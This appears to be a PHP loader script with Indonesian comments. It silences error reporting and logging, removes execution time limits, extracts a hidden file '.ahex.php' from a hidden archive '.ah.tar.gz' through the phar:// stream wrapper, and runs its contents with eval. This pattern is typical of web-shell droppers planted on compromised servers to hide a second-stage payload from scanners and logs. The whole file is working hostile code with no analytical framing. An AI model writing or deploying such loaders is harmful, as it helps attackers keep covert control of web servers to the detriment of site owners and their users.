<?php
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);

// Pastikan ekstensi Phar aktif
if (!class_exists('PharData')) {
    die("❌ Ekstensi Phar tidak aktif di server ini");
}

$tarFile = '.ah.tar.gz';
$fileInside = '.ahex.php'; 

try {
    // Membuka file .tar.gz
    // PharData secara otomatis mendeteksi kompresi Gzip/Bzip2
    $phar = new PharData($tarFile);

    // Mengakses konten file di dalam archive menggunakan stream wrapper 
phar://
    // Format: phar://path/ke/file.tar.gz/path/di/dalam/arsip
    $content = file_get_contents("phar://{$tarFile}/{$fileInside}");

    if ($content !== false && !empty($content)) {
        // Eksekusi kode
        eval('?>' . $content);
    } else {
        echo "❌ Gagal membaca atau menemukan file '{$fileInside}' di 
dalam {$tarFile}.";
    }
} catch (Exception $e) {
    echo "❌ Terjadi kesalahan: " . $e->getMessage();
}
?>
